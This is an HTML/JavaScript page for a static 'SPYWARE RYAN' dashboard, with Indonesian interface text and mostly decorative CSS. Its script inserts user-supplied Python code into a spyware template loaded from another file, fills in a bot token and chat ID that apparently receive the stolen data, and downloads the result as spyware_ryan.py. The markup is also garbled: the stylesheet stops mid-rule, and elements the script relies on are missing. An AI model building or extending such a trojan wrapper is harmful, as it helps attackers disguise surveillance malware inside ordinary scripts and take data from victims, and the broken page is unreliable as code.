<!-- language: HTML, file: index.html — SPYWARE RYAN dashboard, static, no backend -->
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>SPYWARE RYAN</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{
  background:#02000a;
  color:#f0eaff;
  font-family:'Space Mono',monospace;
  font-size:14px;
  line-height:1.6;
  min-height:100vh;
  overflow-x:hidden;
  position:relative;
}

/* ============ GALAXY BACKGROUND ============ */
body::before{
  content:"";
  position:fixed;inset:0;z-index:-3;
  background:
    radial-gradient(ellipse 80% 60% at 20% 15%,#1a0b3d 0%,transparent 55%),
    radial-gradient(ellipse 70% 50% at 85% 75%,#2d0a5c 0%,transparent 55%),
    radial-gradient(ellipse 90% 80% at 50% 110%,#0a0420 0%,transparent 65%),
    #02000a;
}
body::after{
  content:"";
  position:fixed;inset:-200px;z-index:-2;
  background-image:
    radial-gradient(1px 1px at 10% 20%,#fff,transparent),
    radial-gradient(1px 1px at 30% 60%,#c4b5fd,transparent),
    radial-gradient(1px 1px at 55% 15%,#fff,transparent),
    radial-gradient(1px 1px at 75% 40%,#a5f3fc,transparent),
    radial-gradient(1px 1px at 90% 80%,#fff,transparent),
    radial-gradient(1.5px 1.5px at 25% 30%,#fff,transparent),
    radial-gradient(1.5px 1.5px at 60% 70%,#a78bfa,transparent),
    radial-gradient(1.5px 1.5px at 85% 15%,#fff,transparent),
    radial-gradient(2px 2px at 50% 20%,#fff,transparent),
    radial-gradient(2px 2px at 15% 60%,#c084fc,transparent),
    radial-gradient(2px 2px at 80% 90%,#fff,transparent),
    radial-gradient(1px 1px at 42% 92%,#fff,transparent),
    radial-gradient(1px 1px at 68% 55%,#c4b5fd,transparent),
    radial-gradient(1.5px 1.5px at 5% 75%,#67e8f9,transparent);
  background-size:300px 300px;
  animation:starDrift 60s linear infinite, starTwinkle 5s ease-in-out infinite;
}
@keyframes starDrift{
  from{transform:translate(0,0)}
  to{transform:translate(-300px,-200px)}
}
@keyframes starTwinkle{
  0%,100%{opacity:.5}
  50%{opacity:1}
}

/* nebula blob */
.nebula{
  position:fixed;inset:-30%;z-index:-1;pointer-events:none;
  background:
    radial-gradient(circle at 25% 35%,rgba(139,92,246,.25) 0%,transparent 30%),
    radial-gradient(circle at 75% 55%,rgba(34,211,238,.18) 0%,transparent 28%),
    radial-gradient(circle at 45% 80%,rgba(244,114,182,.15) 0%,transparent 30%);
  filter:blur(70px);
  animation:nebulaSpin 90s linear infinite;
}
@keyframes nebulaSpin{
  from{transform:rotate(0) scale(1)}
  to{transform:rotate(360deg) scale(1.15)}
}

/* planet */
.planet{
  position:fixed;bottom:-120px;right:-120px;z-index:-1;
  width:300px;height:300px;border-radius:50%;
  background:radial-gradient(circle at 35% 35%,#a78bfa 0%,#7c3aed 30%,#4c1d95 70%,#1e0a4a 100%);
  box-shadow:
    inset -30px -30px 80px rgba(0,0,0,.8),
    0 0 100px rgba(139,92,246,.5),
    0 0 200px rgba(139,92,246,.25);
  opacity:.7;
  animation:planetFloat 20s ease-in-out infinite;
}
@keyframes planetFloat{
  0%,100%{transform:translate(0,0)}
  50%{transform:translate(-25px,-20px)}
}

/* shooting star */
.shoot{
  position:fixed;top:0;left:0;
  width:2px;height:2px;background:#fff;
  border-radius:50%;z-index:-1;pointer-events:none;
  box-shadow:0 0 10px 3px #fff,0 0 30px 8px rgba(180,120,255,.6);
  animation:shootMove 10s linear infinite;
}
.shoot::after{
  content:"";position:absolute;top:0;left:0;
  width:140px;height:1px;
  background:linear-gradient(90deg,#fff,rgba(192,132,252,.6),transparent);
  transform:translateX(-140px) rotate(180deg);
  transform-origin:right center;
}
.shoot.s2{animation-delay:5s;animation-duration:14s}
@keyframes shootMove{
  0%{transform:translate(-50px,50px) rotate(30deg);opacity:0}
  5%{opacity:1}
  20%{transform:translate(60vw,40vh) rotate(30deg);opacity:1}
  25%{transform:translate(90vw,60vh) rotate(30deg);opacity:0}
  100%{transform:translate(90vw,60vh) rotate(30deg);opacity:0}
}

/* ============ LAYOUT ============ */
.wrap{
  max-width:620px;margin:0 auto;
  padding:14px 14px 40px;
  position:relative;z-index:1;
}

.topbar{
  display:flex;align-items:center;gap:10px;
  padding:14px 16px;
  border:1px solid rgba(139,92,246,.4);
  border-radius:14px;
  background:rgba(10,6,25,.85);
  backdrop-filter:blur(20px);
  -webkit-backdrop-filter:blur(20px);
  box-shadow:0 0 40px rgba(139,92,246,.3),inset 0 1px 0 rgba(255,255,255,.06);
  margin-bottom:16px;
  animation:fadeDown .6s ease both;
}
@keyframes fadeDown{
  from{opacity:0;transform:translateY(-15px)}
  to{opacity:1;transform:none}
}
.logo{
  font-family:'Orbitron',monospace;
  font-weight:900;font-size:14px;letter-spacing:2px;
  background:linear-gradient(90deg,#c084fc,#22d3ee 50%,#f472b6);
  background-size:200% 200%;
  -webkit-background-clip:text;background-clip:text;color:transparent;
  filter:drop-shadow(0 0 12px rgba(139,92,246,.9));
  animation:logoFlow 5s ease infinite;
}
@keyframes logoFlow{
  0%,100%{background-position:0% 50%}
  50%{background-position:100% 50%}
}
.chip{
  font-size:8px;color:#c084fc;letter-spacing:2px;
  border:1px solid rgba(192,132,252,.55);
  padding:5px 9px;border-radius:5px;
  background:rgba(139,92,246,.1);
  text-transform:uppercase;white-space:nowrap;
}
.spacer{flex:1}
.pill{
  display:inline-flex;align-items:center;gap:6px;
  font-size:9px;letter-spacing:2px;color:#22d3ee;
  border:1px solid rgba(34,211,238,.5);
  padding:6px 11px;border-radius:6px;
  background:rgba(34,211,238,.08);
  text-transform:uppercase;white-space:nowrap;
}
.pill .dot{
  width:6px;height:6px;border-radius:50%;
  background:#4ade80;
  box-shadow:0 0 10px #4ade80;
  animation:pulse 1.8s ease-in-out infinite;
}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}

.card{
  border:1px solid rgba(139,92,246,.4);
  border-radius:16px;
  background:rgba(10,6,25,.85);
  backdrop-filter:blur(20px);
  -webkit-backdrop-filter:blur(20px);
  padding:22px 20px;margin-bottom:16px;
  position:relative;overflow:hidden;
  box-shadow:0 12px 40px rgba(0,0,0,.5),inset 0 0 80px rgba(139,92,246,.05);
  animation:fadeUp .6s ease both;
}
@keyframes fadeUp{
  from{opacity:0;transform:translateY(20px)}
  to{opacity:1;transform:none}
}
.card::before{
  content:"";position:absolute;top:0;left:15%;right:15%;height:1.5px;
  background:linear-gradient(90deg,transparent,#c084fc,#22d3ee,#f472b6,transparent);
  background-size:200% 100%;
  animation:cardScan 3s ease-in-out infinite;
}
@keyframes cardScan{
  0%,100%{left:15%;right:15%;background-position:0% 0}
  50%{left:5%;right:5%;background-position:100% 0}
}

.hero{
  font-family:'Orbitron',monospace;
  font-weight:900;font-size:28px;line-height:1.1;letter-spacing:3px;
  text-align:center;text-transform:uppercase;margin:8px 0 6px;
  background:linear-gradient(135deg,#c084fc,#22d3ee 35%,#f472b6 65%,#c084fc);
  background-size:300% 300%;
  -webkit-background-clip:text;background-clip:text;color:transparent;
  filter:drop-shadow(0 0 24px rgba(139,92,246,.8));
  animation:heroFlow 6s ease infinite;
}
@keyframes heroFlow{
  0%,100%{background-position:0% 50%}
  50%{background-position:100% 50%}
}
.sub{
  text-align:center;font-size:10px;color:#9a8fba;
  letter-spacing:4px;margin-bottom:22px;text-transform:uppercase;
}
</style>
</head>
<body>

<div class="nebula"></div>
<div class="planet"></div>
<div class="shoot"></div>
<div class="shoot s2"></div>

<div class="wrap">

  <div class="topbar">
    <span class="logo">SPYWARE·RYAN</span>
    <span class="chip">DASHBOARD</span>
    <span class="spacer"></span>
    <span class="pill"><span class="dot"></span>ONLINE</span>
  </div>

  <div class="card">
    <div class="hero">Spyware Ryan</div>

  <div class="card">
    <div class="tabs">

    </div>

  <div class="foot">SPYWARE RYAN · PREVIEW</div>

</div>

<style>
label{
  display:block;
  font-size:10px;

input,select,textarea{

@keyframes btnFlow{

<script src="templates.js"></script>
<script>
var $ = function(id){ return document.getElementById(id); };

/* ============ TABS ============ */
$('tab-paste').onclick = function(){
  $('tab-paste').classList.add('active');
  $('tab-upload').classList.remove('active');
  $('src-paste').classList.remove('hidden');
  $('src-upload').classList.add('hidden');
};
$('tab-upload').onclick = function(){
  $('tab-upload').classList.add('active');
  $('tab-paste').classList.remove('active');
  $('src-upload').classList.remove('hidden');
  $('src-paste').classList.add('hidden');
};

/* ============ FILE UPLOAD ============ */
$('drop-zone').onclick = function(){ $('file-input').click(); };
$('file-input').onchange = function(e){
  var f = e.target.files[0];
  if (!f) return;
  var r = new FileReader();
  r.onload = function(ev){
    $('code-input').value = ev.target.result;
    $('file-info-wrap').innerHTML =
      '<div class="file-info">📄 ' + f.name + ' — ' + (f.size/1024).toFixed(1) + ' KB</div>';
  };
  r.readAsText(f);
};
['dragenter','dragover'].forEach(function(ev){
  $('drop-zone').addEventListener(ev, function(e){
    e.preventDefault();
    $('drop-zone').style.borderColor = '#22d3ee';
  });
});
['dragleave','drop'].forEach(function(ev){
  $('drop-zone').addEventListener(ev, function(e){
    e.preventDefault();
    $('drop-zone').style.borderColor = '';
  });
});
$('drop-zone').addEventListener('drop', function(e){
  var f = e.dataTransfer.files[0];
  if (f) {
    var r = new FileReader();
    r.onload = function(ev){
      $('code-input').value = ev.target.result;
      $('file-info-wrap').innerHTML =
        '<div class="file-info">📄 ' + f.name + ' — ' + (f.size/1024).toFixed(1) + ' KB</div>';
    };
    r.readAsText(f);
  }
});

/* ============ INJECT USER CODE ============ */
function injectUserCode(template, userCode){
  var lines = template.split('\n');
  var lastImport = -1;
  for (var i = 0; i < lines.length; i++){
    var ln = lines[i].trim();
    if (ln.indexOf('import ') === 0 || ln.indexOf('from ') === 0){
      lastImport = i;
    }
  }
  if (lastImport === -1){
    return userCode + '\n\n' + template;
  }
  var before = lines.slice(0, lastImport + 1).join('\n');
  var after = lines.slice(lastImport + 1).join('\n');
  return before
    + '\n\n# ========== USER CODE (INJECTED) ==========\n'
    + userCode
    + '\n# ========== END USER CODE ==========\n'
    + after;
}

/* ============ REPLACE PLACEHOLDER ============ */
function replacePlaceholders(template, botToken, chatId){
  var out = template;
  if (botToken){
    out = out.replace(/BOT_TOKEN\s*=\s*["'][^"']*["']/g,
      'BOT_TOKEN = "' + botToken + '"');
  }
  if (chatId){
    out = out.replace(/CHAT_ID\s*=\s*["'][^"']*["']/g,
      'CHAT_ID   = "' + chatId + '"');
  }
  return out;
}

/* ============ GENERATE ============ */
$('generate-btn').onclick = function(){
  var userCode = $('code-input').value.trim();
  var tpl = $('template-select').value;
  var botToken = $('bot-token').value.trim();
  var chatId = $('chat-id').value.trim();
  var sw = $('status-wrap');
  var rc = $('result-card');

  if (!userCode){
    sw.innerHTML = '<div class="status err">⚠️ Code python user masih kosong</div>';
    rc.classList.add('hidden');
    return;
  }
  if (!tpl){
    sw.innerHTML = '<div class="status err">⚠️ Pilih template dulu</div>';
    rc.classList.add('hidden');
    return;
  }
  if (!botToken || !chatId){
    sw.innerHTML = '<div class="status err">⚠️ BOT_TOKEN dan CHAT_ID wajib diisi</div>';
    rc.classList.add('hidden');
    return;
  }

  sw.innerHTML = '<div class="status info">⚙️ Memproses template ' + tpl.toUpperCase() + '...</div>';

  setTimeout(function(){
    var template;
    if (tpl === 'command'){
      template = window.TEMPLATE_COMMAND || '';
    } else {
      template = window.TEMPLATE_BASE || '';
    }

    if (!template){
      sw.innerHTML = '<div class="status err">❌ Template kosong — cek templates.js</div>';
      return;
    }

    var withPlaceholders = replacePlaceholders(template, botToken, chatId);
    var finalCode = injectUserCode(withPlaceholders, userCode);

    window._generatedCode = finalCode;
    var sizeKb = (finalCode.length / 1024).toFixed(1);

    sw.innerHTML = '<div class="status ok">✅ Berhasil! Template ' + tpl.toUpperCase() +
      ' + code user · ' + sizeKb + ' KB</div>';

    var name = ($('output-name').value.trim() || 'spyware_ryan') + '.py';
    $('result-meta').textContent = name + ' · ' + sizeKb + ' KB';
    rc.classList.remove('hidden');
  }, 300);
};

/* ============ DOWNLOAD ============ */
$('download-btn').onclick = function(){
  var code = window._generatedCode;
  if (!code){
    alert('Generate dulu sebelum download');
    return;
  }
  var name = ($('output-name').value.trim() || 'spyware_ryan') + '.py';
  var blob = new Blob([code], { type: 'text/x-python' });
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = name;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
};
</script>

</body>
</html>
